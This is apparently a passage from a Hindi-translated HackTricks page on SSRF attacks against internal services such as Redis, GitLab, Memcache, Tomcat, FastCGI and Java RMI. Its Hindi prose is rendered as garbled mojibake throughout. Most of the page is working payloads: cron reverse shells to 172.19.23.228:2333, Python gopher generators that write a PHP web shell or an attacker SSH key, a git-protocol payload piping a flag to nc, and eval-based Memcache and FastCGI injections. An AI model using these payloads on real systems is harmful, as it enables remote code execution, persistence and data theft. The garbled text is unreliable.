рдПрд▓реНрдкрд╛рдЗрди рдХреЛ рдПрдХ рдРрд╕реА рдЫрд╡рд┐ рдХреЗ рд╕рд╛рде рдмрджрд▓реЗрдВ рдЬрд┐рд╕реЗ рдЖрдк рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛рдирд╛ рдЪрд╛рд╣реЗрдВрдЧреЗред

## рдЧрд┐рдЯрд▓реИрдм рдкреНрд░реЛрдореЗрдерд┐рдпрд╕ рд░реЗрдбрд┐рд╕ рдПрдХреНрд╕рдкреЛрд░реНрдЯрд░

**рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдмрд╛рдЙрдВрдб рдкреЛрд░реНрдЯ: 9121**

рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рджреБрд░реНрдмрд▓рддрд╛ рдЧрд┐рдЯрд▓реИрдм рд╕рдВрд╕реНрдХрд░рдг 13.1.1 рд╕реЗ рдкрд╣рд▓реЗ рдХреЗ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкрд░ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддреА рд╣реИред [рдЧрд┐рдЯрд▓реИрдм рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг](https://docs.gitlab.com/ee/administration/monitoring/prometheus/#configuring-prometheus) рдХреЗ рдЕрдиреБрд╕рд╛рд░ `рдкреНрд░реЛрдореЗрдерд┐рдпрд╕ рдФрд░ рдЗрд╕рдХреЗ рдПрдХреНрд╕рдкреЛрд░реНрдЯрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЪрд╛рд▓реВ рд╣реЛрддреЗ рд╣реИрдВ, рдЬреЛ рдЧрд┐рдЯрд▓реИрдм 9.0 рд╕реЗ рд╢реБрд░реВ рд╣реЛрддреЗ рд╣реИрдВред`

рдпреЗ рдПрдХреНрд╕рдкреЛрд░реНрдЯрд░ рдПрдХ рд╣рдорд▓рд╛рд╡рд░реНрддреА рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрддреНрдХреГрд╖реНрдЯ рддрд░реАрдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡рд╣ CVE-2020-13379 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдиреНрдп рд╕реЗрд╡рд╛рдУрдВ рдкрд░ рд╣рдорд▓рд╛ рдХрд░ рд╕рдХреЗред рдЬрд┐рд╕рдореЗрдВ рд╕реЗ рдПрдХ рдПрдХреНрд╕рдкреЛрд░реНрдЯрд░ рдЬрд┐рд╕реЗ рдЖрд╕рд╛рдиреА рд╕реЗ рд╢реЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд╡рд╣ рд╣реИ рд░реЗрдбрд┐рд╕ рдПрдХреНрд╕рдкреЛрд░реНрдЯрд░ред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдПрдВрдбрдкреЙрдЗрдВрдЯ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдпрд╣ рд╕рдВрднрд╡ рдмрдирд╛рддрд╛ рд╣реИ рдХрд┐ рдЙрд╕ рд▓рдХреНрд╖реНрдп рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рджрд┐рдП рдЧрдП рд░реЗрдбрд┐рд╕ рд╕рд░реНрд╡рд░ рдореЗрдВ рд╕рднреА рдХреБрдВрдЬреА рдбрдВрдк рдХрд░ рд╕рдХреЗ:
```bash
http://localhost:9121/scrape?target=redis://127.0.0.1:7001&check-keys=*
```
***

**рдЧреЛрдлрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрднрд╡**

## рд░реЗрдбрд┐рд╕

**рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдмрд╛рдЙрдВрдб рдкреЛрд░реНрдЯ: 6379**

рдЕрдиреБрд╢рдВрд╕рд┐рдд рдкрдарди:

* [HTTP рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд░реЗрдбрд┐рд╕ рдХреЛ рд╣реИрдХ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html)
* [рд░реЗрдбрд┐рд╕ рдХреЗ рдЦрд┐рд▓рд╛рдл SSRF рдЕрдкрд╢рд┐рд╖реНрдЯ](https://maxchadwick.xyz/blog/ssrf-exploits-against-redis)

**рдХреНрд░реЙрди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE** - [рдЧреЛрдлрд░ рд╣рдорд▓реЗ рдХреЗ рд╕рддрд╣](https://blog.chaitin.cn/gopher-attack-surfaces/)
```bash
redis-cli -h $1 flushall
echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1\n\n"|redis-cli -h $1 -x set 1
redis-cli -h $1 config set dir /var/spool/cron/
redis-cli -h $1 config set dbfilename root
redis-cli -h $1 save
```
Gopher:
```bash
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```
**RCE рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╢реЗрд▓ рдЕрдкрд▓реЛрдб (PHP)** - [рд░реЗрдбрд┐рд╕ рдЧреЗрдЯрд╢реЗрд▓ рд╕рд╛рд░рд╛рдВрд╢](https://www.mdeditor.tw/pl/pBy0)
```python
#!/usr/bin/env python
# -*-coding:utf-8-*-

import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
shell="\n\n<?php phpinfo();?>\n\n"
filename="shell.php"
path="/var"
passwd=""

cmd=["flushall",
"set 1 {}".format(shell.replace(" ","${IFS}")),
"config set dir {}".format(path),
"config set dbfilename {}".format(filename),
"save"
]
if passwd:
cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
CRLF="\r\n"
redis_arr = arr.split(" ")
cmd=""
cmd+="*"+str(len(redis_arr))
for x in redis_arr:
cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
cmd+=CRLF
return cmd

if __name__=="__main__":
for x in cmd:
payload += urllib.quote(redis_format(x))
print payload
```
**рдЕрдзрд┐рдХреГрдд\_рдХреБрдВрдЬреА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE** - [Redis Getshell рд╕рд╛рд░рд╛рдВрд╢](https://www.mdeditor.tw/pl/pBy0)
```python
import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
# shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
sshpublic_key = "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8IOnJUAt5b/5jDwBDYJTDULjzaqBe2KW3KhqlaY58XveKQRBLrG3ZV0ffPnIW5SLdueunb4HoFKDQ/KPXFzyvVjqByj5688THkq1RJkYxGlgFNgMoPN151zpZ+eCBdFZEf/m8yIb3/7Cp+31s6Q/DvIFif6IjmVRfWXhnkjNehYjsp4gIEBiiW/jWId5yrO9+AwAX4xSabbxuUyu02AQz8wp+h8DZS9itA9m7FyJw8gCrKLEnM7PK/ClEBevDPSR+0YvvYtnUxeCosqp9VrjTfo5q0nNg9JAvPMs+EA1ohUct9UyXbTehr1Bdv4IXx9+7Vhf4/qwle8HKali3feIZ root@kali\n\n"
filename="authorized_keys"
path="/root/.ssh/"
passwd=""
cmd=["flushall",
"set 1 {}".format(sshpublic_key.replace(" ","${IFS}")),
"config set dir {}".format(path),
"config set dbfilename {}".format(filename),
"save"
]
if passwd:
cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
CRLF="\r\n"
redis_arr = arr.split(" ")
cmd=""
cmd+="*"+str(len(redis_arr))
for x in redis_arr:
cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
cmd+=CRLF
return cmd

if __name__=="__main__":
for x in cmd:
payload += urllib.quote(redis_format(x))
print payload
```
**Git рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ GitLab рдкрд░ RCE**

Liveoverflow рдХреА рдпрд╣рд╛рдВ рд╕реЗ рд╢рд╛рдирджрд╛рд░ рд╡реНрд░рд┐рдЯрдЕрдк [рдпрд╣рд╛рдВ](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/) рджреЗрдЦреЗрдВред

рдпрд╣ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП GitLab рдореЗрдВ рдкреНрд░рдорд╛рдгрд┐рдд рдкрд╣реБрдВрдЪ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рд▓реЗрдХрд┐рди рдореИрдВ рдпрд╣рд╛рдВ рдкреЗрд▓реЛрдб рд╢рд╛рдорд┐рд▓ рдХрд░ рд░рд╣рд╛ рд╣реВрдВ рдХреНрдпреЛрдВрдХрд┐ рдЖрдкрдХреЗ рд╣реИрдХрд┐рдВрдЧ рдХреЗ рд▓рдХреНрд╖реНрдп рдкрд░ `git` рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛рдо рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдкреЗрд▓реЛрдб рд╕рдВрджрд░реНрдн рдХреЗ рд▓рд┐рдП рд╣реИред
```bash
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
## рдореЗрдордХреИрд╢

**рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдмрд╛рдВрдзрд┐рдд рдкреЛрд░реНрдЯ: 11211**

* [vBulletin Memcache RCE](https://www.exploit-db.com/exploits/37815)
* [GitHub Enterprise Memcache RCE](https://www.exploit-db.com/exploits/42392)
* [рдореЗрдордХреИрд╢ рдХреЗ рд▓рд┐рдП рдЙрджрд╛рд╣рд░рдг Gopher рдкреЗрд▓реЛрдб](https://blog.safebuff.com/2016/07/03/SSRF-Tips/#SSRF-memcache-Getshell)
```bash
gopher://[target ip]:11211/_%0d%0aset ssrftest 1 0 147%0d%0aa:2:{s:6:"output";a:1:{s:4:"preg";a:2:{s:6:"search";s:5:"/.*/e";s:7:"replace";s:33:"eval(base64_decode($_POST[ccc]));";}}s:13:"rewritestatus";i:1;}%0d%0a
gopher://192.168.10.12:11211/_%0d%0adelete ssrftest%0d%0a
```
## Apache Tomcat

**рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдмрд╛рдЙрдВрдб рдкреЛрд░реНрдЯ: 80,443 (SSL),8080,8443 (SSL)**

Tomcat 6 рдХреЗ рдЦрд┐рд▓рд╛рдл рдкреНрд░рднрд╛рд╡реА:

[gopher-tomcat-deployer](https://github.com/pimps/gopher-tomcat-deployer)

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ CTF рд▓реЗрдЦ:

[XXE рд╕реЗ RCE рддрдХ: Pwn2Win CTF 2018 рд▓реЗрдЦ](https://bookgin.tw/2018/12/04/from-xxe-to-rce-pwn2win-ctf-2018-writeup/)

## FastCGI

**рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдмрд╛рдЙрдВрдб рдкреЛрд░реНрдЯ: 80,443 (SSL)**

рдпрд╣ [рдпрд╣рд╛рдВ](https://blog.chaitin.cn/gopher-attack-surfaces/) рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
```bash
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00
```
## рдЬрд╛рд╡рд╛ рдЖрд░рдПрдордЖрдИ

**рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдмрд╛рдЙрдВрдб рдкреЛрд░реНрдЯ: 1090,1098,1099,1199,4443-4446,8999-9010,9999**

рдмреНрд▓рд╛рдЗрдВрдб _рдПрд╕рдПрд╕рдЖрд░рдПрдл_ рджреБрд░реНрдмрд▓рддрд╛ рдЬреЛ рдЕрдирд┐рдпрдорд┐рдд рдмрд╛рдЗрдЯреНрд╕ (_рдЧреЛрдлрд░ рдЖрдзрд╛рд░рд┐рдд_) рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЙрдиреНрд╣реЗрдВ _рдЬрд╛рд╡рд╛ рдЖрд░рдПрдордЖрдИ_ рдХреЗ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдХрдВрдкреЛрдиреЗрдВрдЯреНрд╕ рдкрд░ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдпрд╛ рдХреЛрдбрдмреЗрд╕ рд╣рдорд▓реЛрдВ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (_рдЖрд░рдПрдордЖрдИ рд░рдЬрд┐рд╕реНрдЯреНрд░реА_, _рд╡рд┐рддрд░рд┐рдд рдХрдЪрд░рд╛ рд╕рдВрдЧреНрд░рд╛рд╣рдХ_, _рд╕рдХреНрд░рд┐рдпрдг рдкреНрд░рдгрд╛рд▓реА_)ред рдПрдХ рд╡рд┐рд╕реНрддреГрдд рд▓реЗрдЦ рдпрд╣рд╛рдВ рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИ [рдпрд╣рд╛рдВ](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)ред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реВрдЪреА рдореЗрдВ рдПрдХ рдЙрджрд╛рд╣рд░рдг рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдкреЗрд▓реЛрдб рдЬрдирд░реЗрд╢рди рдХреЗ рд▓рд┐рдП:
```
$ rmg serial 127.0.0.1 1090 CommonsCollections6 'curl example.burpcollaborator.net' --component reg --ssrf --gopher
[+] Creating ysoserial payload... done.
[+]
[+] Attempting deserialization attack on RMI Registry endpoint...
[+]
[+] 	SSRF Payload: gopher://127.0.0.1:1090/_%4a%52%4d%49%00%02%4c%50%ac%ed%00%05%77%22%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%02%44%15%4d[...]
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
